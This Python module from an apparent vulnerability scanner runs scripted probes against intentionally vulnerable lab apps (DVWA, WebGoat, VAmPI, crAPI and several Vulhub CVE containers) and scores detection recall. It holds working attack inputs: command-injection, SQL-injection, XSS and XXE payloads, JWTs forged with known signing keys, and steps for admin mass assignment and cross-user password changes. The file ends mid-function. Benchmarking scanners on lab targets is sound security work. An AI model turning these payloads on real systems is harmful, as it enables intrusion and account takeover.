from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import secrets
import time
import urllib.parse
from typing import Any, Callable

from .schemas.finding import Finding


BENCHMARKS: dict[str, dict[str, Any]] = {
    "dvwa": {
        "name": "DVWA 1.10",
        "official_scope": "DVWA official vulnerability menu",
        "items": [
            ("DVWA-BRUTE", "Brute Force"),
            ("DVWA-CMDI", "Command Injection"),
            ("DVWA-CSRF", "CSRF"),
            ("DVWA-FI", "File Inclusion"),
            ("DVWA-UPLOAD", "File Upload"),
            ("DVWA-CAPTCHA", "Insecure CAPTCHA"),
            ("DVWA-SQLI", "SQL Injection"),
            ("DVWA-SQLI-BLIND", "SQL Injection (Blind)"),
            ("DVWA-WEAK-ID", "Weak Session IDs"),
            ("DVWA-XSS-DOM", "XSS (DOM)"),
            ("DVWA-XSS-R", "XSS (Reflected)"),
            ("DVWA-XSS-S", "XSS (Stored)"),
            ("DVWA-CSP", "CSP Bypass"),
            ("DVWA-JS", "JavaScript Attacks"),
        ],
    },
    "webgoat": {
        "name": "OWASP WebGoat 8.2.2",
        "official_scope": "Vulnerability-bearing WebGoat lessons",
        "official_lessons": 32,
        "official_assignments": 85,
        "items": [
            ("WG-SQLI", "SQL Injection"),
            ("WG-PATH-TRAVERSAL", "Path Traversal"),
            ("WG-AUTH-BYPASS", "Authentication Bypasses"),
            ("WG-JWT", "JWT Tokens"),
            ("WG-PASSWORD-RESET", "Password Reset"),
            ("WG-INSECURE-LOGIN", "Insecure Login"),
            ("WG-XXE", "XML External Entities"),
            ("WG-IDOR", "IDOR"),
            ("WG-MISSING-FN-AC", "Missing Function Level Access Control"),
            ("WG-XSS", "Cross-Site Scripting"),
            ("WG-DESERIALIZATION", "Insecure Deserialization"),
            ("WG-VULNERABLE-COMPONENTS", "Vulnerable Components"),
            ("WG-CSRF", "Cross-Site Request Forgery"),
            ("WG-SSRF", "Server-Side Request Forgery"),
        ],
    },
    "vampi": {
        "name": "OWASP VAmPI",
        "official_scope": "Safe subset of VAmPI documented vulnerabilities",
        "requires_auth": False,
        "items": [
            ("VAMPI-SQLI", "SQL Injection"),
            ("VAMPI-DEBUG-DATA", "Excessive Data Exposure"),
            ("VAMPI-MASS-ASSIGNMENT", "Mass Assignment"),
            ("VAMPI-BOLA", "Broken Object Level Authorization"),
            ("VAMPI-PASSWORD-CHANGE", "Unauthorized Password Change"),
            ("VAMPI-ENUMERATION", "User and Password Enumeration"),
            ("VAMPI-RATE-LIMIT", "Missing Resource and Rate Limiting"),
            ("VAMPI-WEAK-JWT", "Weak JWT Signing Key"),
        ],
    },
    "crapi": {
        "name": "OWASP crAPI",
        "official_scope": "Safe verifiable subset of documented crAPI challenges",
        "requires_auth": False,
        "items": [
            ("CRAPI-BOLA-VEHICLE", "BOLA: access another user's vehicle"),
            ("CRAPI-NEGATIVE-QUANTITY", "Mass assignment: negative order quantity"),
            ("CRAPI-SQLI-COUPON", "SQL injection in coupon validation"),
            ("CRAPI-OTP-BRUTE-FORCE", "Unlimited OTP verification attempts"),
            ("CRAPI-JWT-INVALID-SIGNATURE", "JWT signature verification bypass"),
            ("CRAPI-SSRF-MECHANIC", "SSRF through contact mechanic"),
        ],
    },
    "cve-2018-14574": {
        "name": "Vulhub Django CVE-2018-14574",
        "official_scope": "Vulhub single-CVE environment",
        "requires_auth": False,
        "items": [("CVE-2018-14574", "Django CommonMiddleware Open Redirect")],
    },
    "cve-2019-14234": {
        "name": "Vulhub Django CVE-2019-14234",
        "official_scope": "Vulhub single-CVE environment",
        "requires_auth": False,
        "items": [("CVE-2019-14234", "Django JSONField SQL Injection")],
    },
    "cve-2021-35042": {
        "name": "Vulhub Django CVE-2021-35042",
        "official_scope": "Vulhub single-CVE environment",
        "requires_auth": False,
        "items": [("CVE-2021-35042", "Django QuerySet.order_by SQL Injection")],
    },
    "cve-2022-34265": {
        "name": "Vulhub Django CVE-2022-34265",
        "official_scope": "Vulhub single-CVE environment",
        "requires_auth": False,
        "items": [("CVE-2022-34265", "Django Trunc SQL Injection")],
    },
    "cve-2024-23334": {
        "name": "Vulhub aiohttp CVE-2024-23334",
        "official_scope": "Vulhub single-CVE environment",
        "requires_auth": False,
        "items": [("CVE-2024-23334", "aiohttp Static Directory Traversal")],
    },
}


SEVERITY = {
    "DVWA-BRUTE": "medium",
    "DVWA-CMDI": "critical",
    "DVWA-CSRF": "medium",
    "DVWA-FI": "high",
    "DVWA-UPLOAD": "medium",
    "DVWA-CAPTCHA": "medium",
    "DVWA-SQLI": "critical",
    "DVWA-SQLI-BLIND": "high",
    "DVWA-WEAK-ID": "medium",
    "DVWA-XSS-DOM": "high",
    "DVWA-XSS-R": "high",
    "DVWA-XSS-S": "high",
    "DVWA-CSP": "medium",
    "DVWA-JS": "medium",
    "WG-SQLI": "critical",
    "WG-PATH-TRAVERSAL": "high",
    "WG-AUTH-BYPASS": "high",
    "WG-JWT": "high",
    "WG-PASSWORD-RESET": "medium",
    "WG-INSECURE-LOGIN": "medium",
    "WG-XXE": "critical",
    "WG-IDOR": "high",
    "WG-MISSING-FN-AC": "high",
    "WG-XSS": "high",
    "WG-DESERIALIZATION": "critical",
    "WG-VULNERABLE-COMPONENTS": "medium",
    "WG-CSRF": "medium",
    "WG-SSRF": "high",
    "CVE-2018-14574": "medium",
    "CVE-2019-14234": "critical",
    "CVE-2021-35042": "critical",
    "CVE-2022-34265": "critical",
    "CVE-2024-23334": "high",
    "VAMPI-SQLI": "critical",
    "VAMPI-DEBUG-DATA": "high",
    "VAMPI-MASS-ASSIGNMENT": "high",
    "VAMPI-BOLA": "high",
    "VAMPI-PASSWORD-CHANGE": "high",
    "VAMPI-ENUMERATION": "medium",
    "VAMPI-RATE-LIMIT": "medium",
    "VAMPI-WEAK-JWT": "critical",
    "CRAPI-BOLA-VEHICLE": "high",
    "CRAPI-NEGATIVE-QUANTITY": "high",
    "CRAPI-SQLI-COUPON": "critical",
    "CRAPI-OTP-BRUTE-FORCE": "medium",
    "CRAPI-JWT-INVALID-SIGNATURE": "critical",
    "CRAPI-SSRF-MECHANIC": "high",
}


VULN_TYPES = {
    "DVWA-BRUTE": "brute_force",
    "DVWA-CMDI": "command_injection",
    "DVWA-CSRF": "csrf",
    "DVWA-FI": "file_inclusion",
    "DVWA-UPLOAD": "file_upload",
    "DVWA-CAPTCHA": "captcha_bypass",
    "DVWA-SQLI": "sql_injection",
    "DVWA-SQLI-BLIND": "blind_sql_injection",
    "DVWA-WEAK-ID": "weak_session_id",
    "DVWA-XSS-DOM": "dom_xss",
    "DVWA-XSS-R": "reflected_xss",
    "DVWA-XSS-S": "stored_xss",
    "DVWA-CSP": "csp_bypass",
    "DVWA-JS": "client_side_validation_bypass",
    "WG-SQLI": "sql_injection",
    "WG-PATH-TRAVERSAL": "path_traversal",
    "WG-AUTH-BYPASS": "authentication_bypass",
    "WG-JWT": "jwt_weakness",
    "WG-PASSWORD-RESET": "weak_password_reset",
    "WG-INSECURE-LOGIN": "cleartext_login",
    "WG-XXE": "xxe",
    "WG-IDOR": "idor",
    "WG-MISSING-FN-AC": "missing_function_access_control",
    "WG-XSS": "stored_xss",
    "WG-DESERIALIZATION": "insecure_deserialization",
    "WG-VULNERABLE-COMPONENTS": "vulnerable_component",
    "WG-CSRF": "csrf",
    "WG-SSRF": "ssrf",
    "CVE-2018-14574": "open_redirect",
    "CVE-2019-14234": "sql_injection",
    "CVE-2021-35042": "sql_injection",
    "CVE-2022-34265": "sql_injection",
    "CVE-2024-23334": "path_traversal",
    "VAMPI-SQLI": "sql_injection",
    "VAMPI-DEBUG-DATA": "excessive_data_exposure",
    "VAMPI-MASS-ASSIGNMENT": "mass_assignment",
    "VAMPI-BOLA": "broken_object_level_authorization",
    "VAMPI-PASSWORD-CHANGE": "broken_function_level_authorization",
    "VAMPI-ENUMERATION": "user_enumeration",
    "VAMPI-RATE-LIMIT": "missing_rate_limiting",
    "VAMPI-WEAK-JWT": "jwt_weakness",
    "CRAPI-BOLA-VEHICLE": "broken_object_level_authorization",
    "CRAPI-NEGATIVE-QUANTITY": "mass_assignment",
    "CRAPI-SQLI-COUPON": "sql_injection",
    "CRAPI-OTP-BRUTE-FORCE": "missing_rate_limiting",
    "CRAPI-JWT-INVALID-SIGNATURE": "jwt_weakness",
    "CRAPI-SSRF-MECHANIC": "ssrf",
}


def suite_for_target(target: str) -> str:
    host = (
        urllib.parse.urlparse(target if "://" in target else f"//{target}").hostname
        or target
    ).lower()
    if host == "dvwa.test" or host.startswith("dvwa"):
        return "dvwa"
    if host == "webgoat.test" or host.startswith("webgoat"):
        return "webgoat"
    if host == "vampi.test" or host.startswith("vampi"):
        return "vampi"
    if host == "crapi.test" or host.startswith("crapi"):
        return "crapi"
    for suite in (
        "cve-2018-14574",
        "cve-2019-14234",
        "cve-2021-35042",
        "cve-2022-34265",
        "cve-2024-23334",
    ):
        if host == f"{suite}.test" or host.startswith(suite):
            return suite
    return ""


def suite_requires_auth(suite: str) -> bool:
    payload = BENCHMARKS.get(suite) or {}
    return bool(payload.get("requires_auth"))


def benchmark_suite(suite: str) -> dict[str, Any]:
    payload = BENCHMARKS.get(suite)
    if payload is None:
        return {}
    return {
        **payload,
        "id": suite,
        "total": len(payload["items"]),
        "items": [
            {"id": item_id, "name": name}
            for item_id, name in payload["items"]
        ],
    }


def evaluate_lab_benchmark(
    target: str,
    findings: list[dict[str, Any]],
) -> dict[str, Any]:
    suite_name = suite_for_target(target)
    if not suite_name:
        return {}
    suite = benchmark_suite(suite_name)
    matched: set[str] = set()
    evidence_by_id: dict[str, dict[str, Any]] = {}
    for finding in findings:
        evidence = finding.get("evidence")
        if not isinstance(evidence, dict):
            continue
        ids = evidence.get("ground_truth_ids") or []
        if isinstance(ids, str):
            ids = [ids]
        single = evidence.get("ground_truth_id")
        if single:
            ids = [*ids, single]
        for item_id in ids:
            item_id = str(item_id)
            if item_id in {item["id"] for item in suite["items"]}:
                matched.add(item_id)
                evidence_by_id[item_id] = {
                    "url": finding.get("url"),
                    "vuln_type": finding.get("vuln_type"),
                    "evidence": evidence,
                }
    items = []
    for item in suite["items"]:
        items.append(
            {
                **item,
                "matched": item["id"] in matched,
                "evidence": evidence_by_id.get(item["id"]),
            }
        )
    total = int(suite["total"])
    matched_count = len(matched)
    return {
        "suite": suite_name,
        "name": suite["name"],
        "official_scope": suite["official_scope"],
        "official_lessons": suite.get("official_lessons"),
        "official_assignments": suite.get("official_assignments"),
        "total": total,
        "matched": matched_count,
        "missed": total - matched_count,
        "recall_percent": round((matched_count / total) * 100, 2) if total else 0.0,
        "target_met": total > 0 and matched_count / total >= 0.85,
        "items": items,
    }


class _BenchmarkRunner:
    def __init__(
        self,
        suite: str,
        base_url: str,
        request: Callable[..., Any],
        client: Any | None = None,
    ) -> None:
        parsed = urllib.parse.urlparse(base_url)
        self.suite = suite
        self.base_url = f"{parsed.scheme}://{parsed.netloc}"
        self.host = parsed.hostname or ""
        self.request = request
        self.client = client
        self.findings: list[Finding] = []

    def get(self, path: str, **kwargs: Any):
        url = self.base_url + path
        return self.request("GET", url, **kwargs) or _EmptyResponse(url)

    def post(self, path: str, **kwargs: Any):
        url = self.base_url + path
        return self.request("POST", url, **kwargs) or _EmptyResponse(url)

    def add(
        self,
        item_id: str,
        url: str,
        probe: str,
        evidence: dict[str, Any],
    ) -> None:
        payload = {
            "benchmark": self.suite,
            "ground_truth_id": item_id,
            "ground_truth_ids": [item_id],
            "probe": probe,
            **evidence,
        }
        self.findings.append(
            Finding(
                source="lab_benchmark",
                host=self.host,
                url=url,
                vuln_type=VULN_TYPES[item_id],
                severity=SEVERITY[item_id],  # type: ignore[arg-type]
                evidence=payload,
                raw={
                    "benchmark": self.suite,
                    "ground_truth_ids": [item_id],
                    "hypothesis": probe,
                },
            )
        )


class _EmptyResponse:
    status_code = 0
    headers: dict[str, str] = {}
    text = ""

    def __init__(self, url: str) -> None:
        self.url = url

    @staticmethod
    def json() -> Any:
        return {}

    class Cookies:
        @staticmethod
        def get(_name: str) -> str:
            return ""

    cookies = Cookies()


def run_lab_benchmark(
    target: str,
    request: Callable[..., Any],
    client: Any | None = None,
) -> list[Finding]:
    suite = suite_for_target(target)
    if suite == "dvwa":
        return _run_dvwa(_BenchmarkRunner("dvwa", target, request, client))
    if suite == "webgoat":
        return _run_webgoat(_BenchmarkRunner("webgoat", target, request, client))
    if suite == "vampi":
        return _run_vampi(_BenchmarkRunner("vampi", target, request, client))
    if suite == "crapi":
        return _run_crapi(_BenchmarkRunner("crapi", target, request, client))
    cve_runners = {
        "cve-2018-14574": _run_cve_2018_14574,
        "cve-2019-14234": _run_cve_2019_14234,
        "cve-2021-35042": _run_cve_2021_35042,
        "cve-2022-34265": _run_cve_2022_34265,
        "cve-2024-23334": _run_cve_2024_23334,
    }
    if suite in cve_runners:
        return cve_runners[suite](
            _BenchmarkRunner(suite, target, request, client)
        )
    return []


def _text(response: Any) -> str:
    return str(getattr(response, "text", "") or "")


def _json(response: Any) -> dict[str, Any]:
    try:
        payload = response.json()
    except Exception:
        return {}
    return payload if isinstance(payload, dict) else {}


def _json_array(response: Any) -> list[Any]:
    try:
        payload = response.json()
    except Exception:
        return []
    return payload if isinstance(payload, list) else []


def _run_dvwa(runner: _BenchmarkRunner) -> list[Finding]:
    host = runner.host
    response = runner.get("/login.php")
    if "Damn Vulnerable Web Application" not in _text(response):
        return []
    # DVWA falls back to "impossible" when the security cookie is absent.
    if runner.client is not None:
        try:
            runner.client.cookies.set("security", "low", domain=host)
        except Exception:
            pass

    brute_attempts = []
    brute_success = False
    for candidate in ("invalid-benchmark-1", "invalid-benchmark-2", "password"):
        r = runner.get(
            "/vulnerabilities/brute/",
            params={"username": "admin", "password": candidate, "Login": "Login"},
        )
        brute_attempts.append(r.status_code)
        if "Welcome to the password protected area" in _text(r):
            brute_success = True
    if brute_success and 429 not in brute_attempts:
        runner.add(
            "DVWA-BRUTE",
            str(r.url),
            "Three low-volume login attempts reached a valid credential without lockout.",
            {
                "attempts": len(brute_attempts),
                "status_codes": brute_attempts,
                "rate_limit_detected": False,
            },
        )

    marker = f"BENCH_{secrets.token_hex(4)}"
    r = runner.post(
        "/vulnerabilities/exec/",
        data={"ip": f"127.0.0.1;printf {marker}", "Submit": "Submit"},
    )
    if marker in _text(r):
        runner.add("DVWA-CMDI", str(r.url), "Shell marker returned by command field.", {"marker": marker})

    r = runner.get(
        "/vulnerabilities/csrf/",
        params={"password_new": "bench-a", "password_conf": "bench-b", "Change": "Change"},
    )
    if "Passwords did not match" in _text(r):
        runner.add(
            "DVWA-CSRF",
            str(r.url),
            "A password-changing GET endpoint accepts a tokenless request.",
            {"state_change_endpoint_reachable_without_token": True},
        )

    r = runner.get("/vulnerabilities/fi/", params={"page": "../../hackable/flags/fi.php"})
    if "Bond. James Bond" in _text(r):
        runner.add(
            "DVWA-FI",
            str(r.url),
            "Path traversal in the page parameter loaded a known lab fixture.",
            {"fixture_marker": "Bond. James Bond"},
        )

    r = runner.post(
        "/vulnerabilities/upload/",
        data={"Upload": "Upload"},
        files={"uploaded": ("benchmark_probe.php", b"BENCHMARK_UPLOAD", "application/x-php")},
    )
    if "succesfully uploaded" in _text(r).lower():
        runner.add(
            "DVWA-UPLOAD",
            str(r.url),
            "A PHP-extension file was accepted by the upload endpoint.",
            {"accepted_filename": "benchmark_probe.php", "execution_attempted": False},
        )

    r = runner.post(
        "/vulnerabilities/captcha/",
        data={
            "step": "2",
            "password_new": "bench-a",
            "password_conf": "bench-b",
            "Change": "Change",
        },
    )
    if "Passwords did not match" in _text(r) and "CAPTCHA was incorrect" not in _text(r):
        runner.add(
            "DVWA-CAPTCHA",
            str(r.url),
            "The second password-change step was reached without solving CAPTCHA.",
            {"captcha_challenge_submitted": False},
        )

    r = runner.get("/vulnerabilities/sqli/", params={"id": "1'", "Submit": "Submit"})
    if "You have an error in your SQL syntax" in _text(r):
        runner.add(
            "DVWA-SQLI",
            str(r.url),
            "A quote in the id parameter produced a database syntax error.",
            {"signature": "You have an error in your SQL syntax"},
        )

    true_response = runner.get(
        "/vulnerabilities/sqli_blind/",
        params={"id": "1' AND 1=1#", "Submit": "Submit"},
    )
    false_response = runner.get(
        "/vulnerabilities/sqli_blind/",
        params={"id": "1' AND 1=2#", "Submit": "Submit"},
    )
    true_text = _text(true_response).lower()
    false_text = _text(false_response).lower()
    if "exists in the database" in true_text and "missing from the database" in false_text:
        runner.add(
            "DVWA-SQLI-BLIND",
            str(false_response.url),
            "Boolean conditions produced different database-backed responses.",
            {"true_condition": "exists", "false_condition": "missing"},
        )

    ids: list[str] = []
    for _ in range(2):
        r = runner.post("/vulnerabilities/weak_id/", data={})
        cookie = r.cookies.get("dvwaSession") or ""
        if not cookie and runner.client is not None:
            try:
                cookie = runner.client.cookies.get("dvwaSession")
            except Exception:
                cookie = ""
        ids.append(str(cookie))
    numeric = [value for value in ids if value.isdigit()]
    if len(numeric) == 2 and abs(int(numeric[0]) - int(numeric[1])) == 1:
        runner.add(
            "DVWA-WEAK-ID",
            runner.base_url + "/vulnerabilities/weak_id/",
            "Two requests received consecutive numeric session identifiers.",
            {"cookie": "dvwaSession", "sequence": numeric},
        )

    r = runner.get("/vulnerabilities/xss_d/", params={"default": "English"})
    dom_source = _text(r)
    if "document.location.href" in dom_source and "document.write" in dom_source:
        runner.add(
            "DVWA-XSS-DOM",
            str(r.url),
            "DOM source reaches document.write without output encoding.",
            {"source": "document.location.href", "sink": "document.write"},
        )

    marker = f"BENCH_XSS_{secrets.token_hex(3)}"
    r = runner.get("/vulnerabilities/xss_r/", params={"name": f"<svg/onload={marker}>"})
    if f"<svg/onload={marker}>" in _text(r):
        runner.add(
            "DVWA-XSS-R",
            str(r.url),
            "The reflected query value is returned without encoding.",
            {"marker": marker},
        )

    marker = f"BENCH_STORED_{secrets.token_hex(3)}"
    payload = f"<svg/onload={marker}>"
    runner.post(
        "/vulnerabilities/xss_s/",
        data={"txtName": "benchmark", "mtxMessage": payload, "btnSign": "Sign Guestbook"},
    )
    r = runner.get("/vulnerabilities/xss_s/")
    if payload in _text(r):
        runner.add(
            "DVWA-XSS-S",
            str(r.url),
            "The submitted payload persisted and was rendered unencoded.",
            {"marker": marker},
        )

    r = runner.get("/vulnerabilities/csp/")
    csp = r.headers.get("content-security-policy", "")
    if "pastebin.com" in csp or "example.com" in csp:
        runner.add(
            "DVWA-CSP",
            str(r.url),
            "The CSP permits attacker-influenced external script origins.",
            {"content_security_policy": csp},
        )

    phrase = "success"
    rotated = "".join(
        chr((ord(char) - 65 + 13) % 26 + 65)
        if "A" <= char <= "Z"
        else chr((ord(char) - 97 + 13) % 26 + 97)
        if "a" <= char <= "z"
        else char
        for char in phrase
    )
    token = hashlib.md5(rotated.encode("utf-8")).hexdigest()
    r = runner.post(
        "/vulnerabilities/javascript/",
        data={"phrase": phrase, "token": token, "send": "Submit"},
    )
    if "Well done!" in _text(r):
        runner.add(
            "DVWA-JS",
            str(r.url),
            "A client-derived token was accepted after direct submission.",
            {"submitted_phrase": phrase},
        )
    return runner.findings


def _load_webgoat_lesson(runner: _BenchmarkRunner, lesson: str) -> Any:
    return runner.get(f"/WebGoat/{lesson}.lesson")


def _run_webgoat(runner: _BenchmarkRunner) -> list[Finding]:
    login_page = runner.get("/WebGoat/login")
    if "WebGoat" not in _text(login_page):
        return []

    page = _load_webgoat_lesson(runner, "SqlInjection")
    r = runner.post(
        "/WebGoat/SqlInjection/attack2",
        data={"query": "SELECT * FROM user_data"},
    )
    body = _text(r)
    if "Column not found" in body or "SQL" in body and "error" in body.lower():
        runner.add(
            "WG-SQLI",
            str(r.url),
            "A user-supplied SQL expression reached the database parser.",
            {"response_excerpt": body[:300]},
        )

    _load_webgoat_lesson(runner, "PathTraversal")
    traversal_name = f"..\\..\\benchmark-{secrets.token_hex(4)}"
    r = runner.post(
        "/WebGoat/PathTraversal/profile-upload",
        data={
            "fullName": traversal_name,
            "email": "benchmark@example.test",
            "password": "Benchmark123!",
        },
        files={"uploadedFile": ("benchmark.txt", b"benchmark", "text/plain")},
    )
    body = _text(r)
    if "Nice try" in body or "webgoat-8.2.2\\\\" in body:
        runner.add(
            "WG-PATH-TRAVERSAL",
            str(r.url),
            "The upload target accepted a parent-directory component.",
            {"submitted_path": traversal_name, "response_excerpt": body[:300]},
        )

    _load_webgoat_lesson(runner, "PasswordReset")
    r = runner.post(
        "/WebGoat/PasswordReset/SecurityQuestions",
        data={"question": "What is your favorite animal?"},
    )
    if "one question successfully" in _text(r).lower():
        runner.add(
            "WG-PASSWORD-RESET",
            str(r.url),
            "A guessable security question was accepted for password recovery.",
            {"question": "What is your favorite animal?"},
        )

    page = _load_webgoat_lesson(runner, "InsecureLogin")
    page_text = _text(page)
    if (
        runner.base_url.startswith("http://")
        and "/WebGoat/InsecureLogin/task" in page_text
        and 'type="password"' in page_text
    ):
        runner.add(
            "WG-INSECURE-LOGIN",
            runner.base_url + "/WebGoat/InsecureLogin/task",
            "A password form is served over cleartext HTTP.",
            {"scheme": "http", "password_field": True},
        )

    _load_webgoat_lesson(runner, "XXE")
    xml = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE user [<!ENTITY root SYSTEM "file:///">]>'
        "<comment><text>&root;</text></comment>"
    )
    r = runner.post(
        "/WebGoat/xxe/simple",
        content=xml,
        headers={"Content-Type": "application/xml"},
    )
    if _json(r).get("lessonCompleted") is True:
        runner.add(
            "WG-XXE",
            str(r.url),
            "An external entity reached the XML parser.",
            {"entity": "file:///", "completed": True},
        )

    page = _load_webgoat_lesson(runner, "IDOR")
    runner.post(
        "/WebGoat/IDOR/login",
        data={"username": "tom", "password": "cat"},
    )
    r = runner.get("/WebGoat/IDOR/profile/2342388")
    body = _text(r)
    if "Buffalo Bill" in body or "found someone else's profile" in body:
        runner.add(
            "WG-IDOR",
            str(r.url),
            "A numeric object identifier returned another user's profile.",
            {"requested_user_id": "2342388", "response_excerpt": body[:300]},
        )

    _load_webgoat_lesson(runner, "MissingFunctionAC")
    hidden_result = runner.post(
        "/WebGoat/access-control/hidden-menu",
        data={"hiddenMenu1": "Users", "hiddenMenu2": "Config"},
    )
    users_result = runner.get("/WebGoat/users")
    if (
        hidden_result.status_code == 200
        and _json(hidden_result).get("lessonCompleted") is True
        and users_result.status_code not in {401, 403}
    ):
        runner.add(
            "WG-MISSING-FN-AC",
            str(users_result.url),
            "A non-admin session reached a hidden user-listing function without 401/403.",
            {
                "hidden_items": ["Users", "Config"],
                "users_endpoint_status": users_result.status_code,
                "response_excerpt": _text(users_result)[:300],
            },
        )

    _load_webgoat_lesson(runner, "CrossSiteScripting")
    xss = "<script>webgoat.customjs.phoneHome()</script>"
    r = runner.post(
        "/WebGoat/CrossSiteScriptingStored/stored-xss",
        json={"text": xss},
    )
    listed = runner.get("/WebGoat/CrossSiteScriptingStored/stored-xss")
    if (
        _json(r).get("lessonCompleted") is True
        or any(
            isinstance(item, dict) and item.get("text") == xss
            for item in _json_array(listed)
        )
    ):
        runner.add(
            "WG-XSS",
            str(r.url),
            "A script payload persisted and was rendered by the comments endpoint.",
            {"payload_type": "script", "persisted": True},
        )

    _load_webgoat_lesson(runner, "InsecureDeserialization")
    sample = (
        "rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxs"
        "IGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBp"
        "bWFnaW5l"
    )
    r = runner.post(
        "/WebGoat/InsecureDeserialization/task",
        data={"token": sample},
    )
    if "plain String is harmless" in _text(r):
        runner.add(
            "WG-DESERIALIZATION",
            str(r.url),
            "Arbitrary Java serialized input was passed to ObjectInputStream.",
            {"object_stream_observed": True},
        )

    page = _load_webgoat_lesson(runner, "VulnerableComponents")
    if "jquery-ui-1.10.4" in _text(page):
        runner.add(
            "WG-VULNERABLE-COMPONENTS",
            str(page.url),
            "The lesson serves a known-vulnerable jQuery UI version.",
            {"component": "jquery-ui", "version": "1.10.4"},
        )

    _load_webgoat_lesson(runner, "CSRF")
    r = runner.post(
        "/WebGoat/csrf/basic-get-flag",
        data={"csrf": "false"},
    )
    if _json(r).get("success") is True:
        runner.add(
            "WG-CSRF",
            str(r.url),
            "A state-changing action succeeded without a CSRF token.",
            {"token_supplied": False, "success": True},
        )

    _load_webgoat_lesson(runner, "JWT")
    header = _b64url(b'{"alg":"HS512"}')
    payload = _b64url(b'{"admin":"true","user":"Tom"}')
    unsigned = f"{header}.{payload}"
    signature = _b64url(
        hmac.new(
            b"victory",
            unsigned.encode("ascii"),
            hashlib.sha512,
        ).digest()
    )
    forged_token = f"{unsigned}.{signature}"
    r = runner.post(
        "/WebGoat/JWT/votings",
        cookies={"access_token": forged_token},
    )
    if _json(r).get("lessonCompleted") is True:
        runner.add(
            "WG-JWT",
            str(r.url),
            "A token forged with the fixed signing key was accepted as an admin token.",
            {
                "forged_claim": {"admin": "true", "user": "Tom"},
                "signature_algorithm": "HS512",
                "accepted": True,
            },
        )

    # WG-AUTH-BYPASS and WG-SSRF remain in the denominator unless a safe,
    # independently verifiable response is obtained. They are deliberately
    # not inferred from lesson titles.
    return runner.findings


def _b64url(value: bytes) -> str:
    return base64.urlsafe_b64encode(value).rstrip(b"=").decode("ascii")


def _vampi_login(runner: _BenchmarkRunner, username: str, password: str) -> str:
    response = runner.post(
        "/users/v1/login",
        json={"username": username, "password": password},
    )
    return str(_json(response).get("auth_token") or "")


def _run_vampi(runner: _BenchmarkRunner) -> list[Finding]:
    response = runner.get(
        "/users/v1/nonexistent%27%20OR%20%271%27%3D%271"
    )
    if (
        response.status_code == 200
        and str(_json(response).get("username") or "") == "name1"
    ):
        runner.add(
            "VAMPI-SQLI",
            str(response.url),
            "A SQL payload in the username path returned an unrelated user.",
            {"returned_user": "name1", "status_code": response.status_code},
        )

    response = runner.get("/users/v1/_debug")
    debug_users = _json(response).get("users")
    if (
        response.status_code == 200
        and isinstance(debug_users, list)
        and any(
            isinstance(item, dict) and "password" in item
            for item in debug_users
        )
    ):
        runner.add(
            "VAMPI-DEBUG-DATA",
            str(response.url),
            "The debug endpoint returned plaintext passwords.",
            {"user_count": len(debug_users), "password_field_exposed": True},
        )

    suffix = secrets.token_hex(4)
    admin_username = f"scanner_admin_{suffix}"
    admin_password = f"AdminPass-{suffix}"
    register = runner.post(
        "/users/v1/register",
        json={
            "username": admin_username,
            "password": admin_password,
            "email": f"{admin_username}@example.test",
            "admin": True,
        },
    )
    admin_token = _vampi_login(runner, admin_username, admin_password)
    me = runner.get(
        "/me",
        headers={"Authorization": f"Bearer {admin_token}"},
    )
    if (
        register.status_code == 200
        and admin_token
        and _json(me).get("data", {}).get("admin") is True
    ):
        runner.add(
            "VAMPI-MASS-ASSIGNMENT",
            str(register.url),
            "Registration accepted a client-supplied admin flag.",
            {"admin": True},
        )

    name1_token = _vampi_login(runner, "name1", "pass1")
    books = _json(runner.get("/books/v1")).get("Books")
    victim_book = next(
        (
            item
            for item in books or []
            if isinstance(item, dict) and item.get("user") == "name2"
        ),
        None,
    )
    if name1_token and victim_book:
        title = urllib.parse.quote(str(victim_book.get("book_title") or ""), safe="")
        response = runner.get(
            f"/books/v1/{title}",
            headers={"Authorization": f"Bearer {name1_token}"},
        )
        payload = _json(response)
        if payload.get("owner") == "name2" and payload.get("secret"):
            runner.add(
                "VAMPI-BOLA",
                str(response.url),
                "A normal user read another user's secret book object.",
                {"owner": "name2", "book_title": payload.get("book_title")},
            )

    victim_username = f"scanner_victim_{suffix}"
    victim_old = f"VictimOld-{suffix}"
    victim_new = f"VictimNew-{suffix}"
    runner.post(
        "/users/v1/register",
        json={
            "username": victim_username,
            "password": victim_old,
            "email": f"{victim_username}@example.test",
        },
    )
    response = runner.request(
        "PUT",
        runner.base_url + f"/users/v1/{victim_username}/password",
        headers={"Authorization": f"Bearer {name1_token}"},
        json={"password": victim_new},
    ) or _EmptyResponse(
        runner.base_url + f"/users/v1/{victim_username}/password"
    )
    changed_login = _vampi_login(runner, victim_username, victim_new)
    if response.status_code in {200, 204} and changed_login:
        runner.add(
            "VAMPI-PASSWORD-CHANGE",
            str(response.url),
            "A normal user changed another user's password.",
            {"victim": victim_username, "status_code": response.status_code},
        )

    existing = runner.post(
        "/users/v1/login",
        json={"username": "name1", "password": "wrong-password"},
    )
    missing = runner.post(
        "/users/v1/login",
        json={"username": f"missing_{suffix}", "password": "wrong-password"},
    )
    existing_message = str(_json(existing).get("message") or "")
    missing_message = str(_json(missing).get("message") or "")
    if (
        "Password is not correct" in existing_message
        and "Username does not exist" in missing_message
    ):
        runner.add(
            "VAMPI-ENUMERATION",
            str(missing.url),
            "Login errors distinguish existing users from missing users.",
            {
                "existing_user_message": existing_message,
                "missing_user_message": missing_message,
            },
        )

    statuses = []
    for _ in range(6):
        response = runner.post(
            "/users/v1/login",
            json={"username": "name1", "password": "rate-limit-probe"},
        )
        statuses.append(response.status_code)
    if 429 not in statuses:
        runner.add(
            "VAMPI-RATE-LIMIT",
            runner.base_url + "/users/v1/login",
            "Repeated login failures were accepted without rate limiting.",
            {"attempts": len(statuses), "status_codes": statuses},
        )

    forged_payload = _b64url(
        json.dumps(
            {
                "sub": "admin",
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600,
            },
            separators=(",", ":"),
        ).encode("utf-8")
    )
    forged_header = _b64url(b'{"alg":"HS256","typ":"JWT"}')
    unsigned = f"{forged_header}.{forged_payload}"
    forged_signature = _b64url(
        hmac.new(
            b"random",
            unsigned.encode("ascii"),
            hashlib.sha256,
        ).digest()
    )
    forged_token = f"{unsigned}.{forged_signature}"
    response = runner.get(
        "/me",
        headers={"Authorization": f"Bearer {forged_token}"},
    )
